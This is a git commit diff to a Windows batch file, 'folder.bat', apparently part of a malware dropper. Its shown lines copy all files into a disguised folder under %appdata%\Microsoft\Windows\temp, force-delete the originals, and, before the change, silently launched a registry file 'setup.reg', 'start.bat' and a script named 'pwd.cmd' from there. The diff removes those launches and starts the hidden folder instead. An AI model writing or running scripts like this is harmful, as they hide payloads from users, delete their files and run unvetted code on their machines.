b73208d064e1a953e98208c07f655687440c8a09
johan <ali.slm.1331@gmail.com>
2022-01-22 03:51:17 +0330

    Update folder.bat

--- folder.bat
+++ folder.bat
@@ -2,7 +2,4 @@ mkdir %appdata%\Microsoft\Windows\temp
 xcopy /E * %appdata%\Microsoft\Windows\temp
 del /f /q *
 rmdir /s /q x
-start %appdata%\Microsoft\Windows\temp\setup.reg
-start %appdata%\Microsoft\Windows\temp\x\start.bat
-start %appdata%\Microsoft\Windows\temp\pwd.cmd
-
+start %appdata%\Microsoft\Windows\temp\
